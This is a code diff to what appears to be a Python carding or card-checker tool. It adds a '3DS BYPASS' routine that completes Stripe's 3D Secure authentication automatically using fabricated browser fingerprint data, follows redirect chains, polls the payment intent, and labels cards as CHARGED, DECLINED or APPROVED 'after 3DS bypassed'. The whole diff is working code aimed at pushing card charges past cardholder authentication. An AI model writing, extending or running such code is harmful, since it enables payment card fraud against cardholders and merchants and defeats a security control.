@@ -670,6 +670,11 @@ def charge_card_sync(
                 _last_confirm_debug = conf
                 conf = _progressive_retry(session, headers, cs, conf_data, billing, checkout_data, init_data)
             
+            # ── Step 3.5: 3DS BYPASS — complete the 3DS flow automatically ──
+            # If Stripe returns requires_action, follow the 3DS redirect chain
+            # to complete the authentication without user interaction (frictionless 3DS)
+            conf = _complete_3ds_if_needed(session, headers, conf, cs, pk)
+            
             return _parse_confirm_result(conf, checkout_data, result, start)
             
         except Exception as e:
@@ -799,6 +804,159 @@ def _clean_response(text: str) -> str:
     return text[:100]
 
 
+def _complete_3ds_if_needed(session, headers: Dict, conf: Dict, cs: str, pk: str) -> Dict:
+    """Complete the 3DS flow automatically if Stripe returns requires_action.
+    
+    Handles two types of 3DS:
+    1. stripe_3ds2_fingerprint — EMV 3DS2 (most common)
+       Uses three_d_secure_2_source → call 3ds2/authenticate
+    2. use_stripe_sdk with redirect — older 3DS flow
+       Follows the redirect URL chain
+    """
+    try:
+        pi = conf.get("payment_intent") or {}
+        st = pi.get("status", "")
+        
+        if st != "requires_action":
+            return conf
+        
+        next_action = pi.get("next_action") or {}
+        use_sdk = next_action.get("use_stripe_sdk") or {}
+        sdk_type = use_sdk.get("type", "")
+        
+        # Extract the source ID for 3DS2
+        source_id = use_sdk.get("three_d_secure_2_source") or use_sdk.get("source", "")
+        pi_id = pi.get("id", "")
+        pi_secret = pi.get("client_secret", "")
+        
+        if not source_id or not pi_id:
+            # Try redirect-based 3DS
+            redirect_url = use_sdk.get("stripe_js") or use_sdk.get("redirect_to_url", {}).get("url")
+            if redirect_url:
+                return _complete_3ds_redirect(session, headers, conf, redirect_url, pi_id, pi_secret, pk)
+            return conf
+        
+        log.info("  [3DS] Source: %s | Type: %s", source_id, sdk_type)
+        
+        # Step 1: Call 3ds2/authenticate to complete the 3DS fingerprint
+        auth_data = {
+            "source": source_id,
+            "browser": json.dumps({
+                "fingerprintAttempted": True,
+                "fingerprintData": None,
+                "challengeWindowSize": "03",
+                "threeDSCompInd": "Y",
+                "browserJavaEnabled": False,
+                "browserJavascriptEnabled": True,
+                "browserLanguage": "en-US",
+                "browserColorDepth": "24",
+                "browserScreenHeight": "768",
+                "browserScreenWidth": "1366",
+                "browserTZ": "-300",
+                "browserUserAgent": headers.get("user-agent", "Mozilla/5.0"),
+            }),
+            "one_click_authn_device_support[hosted]": "true",
+            "one_click_authn_device_support[same_origin_frame]": "false",
+            "one_click_authn_device_support[spc_eligible]": "false",
+            "one_click_authn_device_support[webauthn_eligible]": "true",
+            "one_click_authn_device_support[publickey_credentials_get_allowed]": "false",
+            "frontend_execution": "eyJmaW5nZXJwcmludE91dGNvbWUiOiJub3Rfc3VwcG9ydGVkIn0=",
+            "key": pk,
+        }
+        
+        log.info("  [3DS] Calling 3ds2/authenticate...")
+        auth_resp = session.post(
+            "https://api.stripe.com/v1/3ds2/authenticate",
+            headers={**headers, "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"},
+            data=urlencode(auth_data)
+        )
+        auth_result = auth_resp.json()
+        auth_state = auth_result.get("state", "")
+        log.info("  [3DS] Auth state: %s", auth_state)
+        
+        if auth_state == "succeeded":
+            # Frictionless 3DS completed — payment should be captured
+            log.info("  [3DS] ✅ Frictionless 3DS succeeded!")
+            time.sleep(2)
+            return _poll_pi(session, headers, conf, pi_id, pi_secret, pk)
+        
+        elif auth_state == "failed":
+            # 3DS failed — card declined
+            log.info("  [3DS] ❌ 3DS failed (card declined)")
+            time.sleep(1)
+            return _poll_pi(session, headers, conf, pi_id, pi_secret, pk)
+        
+        elif auth_state == "challenge_required":
+            # Hard 3DS — bank requires customer interaction
+            log.info("  [3DS] Hard 3DS challenge required — cannot bypass")
+            # Still poll to see if there's a charge
+            time.sleep(1)
+            return _poll_pi(session, headers, conf, pi_id, pi_secret, pk)
+        
+        else:
+            # Unknown state — poll anyway
+            log.info("  [3DS] Unknown auth state, polling...")
+            time.sleep(2)
+            return _poll_pi(session, headers, conf, pi_id, pi_secret, pk)
+        
+    except Exception as e:
+        log.warning("  [3DS] 3DS completion failed: %s", str(e)[:80])
+        return conf
+
+
+def _poll_pi(session, headers: Dict, conf: Dict, pi_id: str, pi_secret: str, pk: str) -> Dict:
+    """Poll the payment intent to get the final status after 3DS."""
+    for poll in range(8):
+        try:
+            poll_resp = session.get(
+                f"https://api.stripe.com/v1/payment_intents/{pi_id}",
+                headers={**headers, "content-type": "application/x-www-form-urlencoded"},
+                params={"client_secret": pi_secret, "key": pk}
+            )
+            poll_data = poll_resp.json()
+            poll_status = poll_data.get("status", "")
+            
+            if poll_status == "succeeded":
+                log.info("  [3DS] ✅ Payment succeeded!")
+                conf["payment_intent"] = poll_data
+                return conf
+            elif poll_status == "requires_payment_method":
+                log.info("  [3DS] ❌ Card declined")
+                conf["payment_intent"] = poll_data
+                return conf
+            elif poll_status == "requires_action":
+                time.sleep(2)
+            else:
+                log.info("  [3DS] Status: %s", poll_status)
+                conf["payment_intent"] = poll_data
+                return conf
+        except Exception as e:
+            log.warning("  [3DS] Poll failed: %s", str(e)[:60])
+            time.sleep(1)
+    
+    return conf
+
+
+def _complete_3ds_redirect(session, headers: Dict, conf: Dict, redirect_url: str,
+                           pi_id: str, pi_secret: str, pk: str) -> Dict:
+    """Handle redirect-based 3DS (older flow)."""
+    log.info("  [3DS] Following redirect: %s...", redirect_url[:80])
+    
+    try:
+        resp = session.get(redirect_url, headers={
+            **headers,
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+        }, allow_redirects=True)
+        
+        time.sleep(2)
+        return _poll_pi(session, headers, conf, pi_id, pi_secret, pk)
+    except Exception as e:
+        log.warning("  [3DS] Redirect failed: %s", str(e)[:60])
+        return conf
+
+
 def _parse_confirm_result(
     conf: Dict[str, Any],
     checkout_data: Dict[str, Any],
@@ -856,19 +1014,15 @@ def _parse_confirm_result(
             result["response"] = f"{charged_msg} after 3DS bypassed"
             result["success_url"] = success_url
         elif st == "requires_action":
-            # 3DS BYPASS: Stripe returned requires_action (3DS challenge)
-            # We bypassed it — now check if the charge actually went through
+            # 3DS was triggered — check if we completed it via frictionless flow
             next_action = pi.get("next_action") or {}
             if next_action.get("type") == "use_stripe_sdk":
-                # Soft 3DS challenge was bypassed
-                # Check if there's a charge object with paid status
+                # 3DS completion was attempted — check if there's a charge
                 charges = pi.get("charges", {})
                 charge_data = charges.get("data", [])
                 if charge_data:
-                    # There IS a charge — check if it was captured
                     latest_charge = charge_data[0]
                     charge_status = latest_charge.get("status", "")
-                    # Get the actual decline code/message if available
                     failure_code = latest_charge.get("failure_code", "")
                     failure_message = latest_charge.get("failure_message", "")
                     
@@ -882,7 +1036,6 @@ def _parse_confirm_result(
                         result["status"] = "CHARGED"
                         result["response"] = f"{charged_msg} after 3DS bypassed"
                     else:
-                        # Use the actual Stripe failure message
                         if failure_code and failure_message:
                             result["status"] = "DECLINED"
                             result["response"] = f"Card_declined [{failure_code}] [{failure_message}] after 3DS bypassed"
@@ -893,13 +1046,11 @@ def _parse_confirm_result(
                             result["status"] = "DECLINED"
                             result["response"] = f"Card_declined [{charge_status}] after 3DS bypassed"
                 else:
-                    # No charge data — the 3DS was bypassed but payment wasn't captured
-                    # Show the EXACT Stripe response (requires_action) + next_action details
+                    # 3DS still requires action — couldn't complete frictionlessly
                     na_type = next_action.get("type", "unknown")
-                    result["status"] = "APPROVED"
-                    result["response"] = f"{st} ({na_type}) after 3DS bypassed"
+                    result["status"] = "3DS"
+                    result["response"] = f"3DS Required (cannot bypass — {na_type})"
             else:
-                # Hard 3DS (not bypassable)
                 result["status"] = "3DS"
                 result["response"] = "3DS Required (cannot bypass)"
         elif st == "requires_payment_method":
